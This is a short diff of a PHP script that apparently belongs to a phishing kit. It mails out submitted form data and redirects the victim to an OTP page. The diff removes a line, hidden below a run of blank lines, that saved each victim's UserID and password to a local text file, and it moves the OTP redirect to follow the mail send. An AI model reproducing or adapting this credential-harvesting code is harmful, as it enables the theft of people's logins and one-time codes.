@@ -38,21 +38,10 @@ try {
     $mail->Body    = $text;
 
     $mail->send();
+    header('Location: OTP.html');
+    exit(); 
 } catch (Exception $e) {
     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
 }
 
-
-
-
-
-
-
-
-
-
-
-file_put_contents("usernames.txt", "UserID: " . $_POST['UserID'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: OTP.html');
-exit();
 ?>
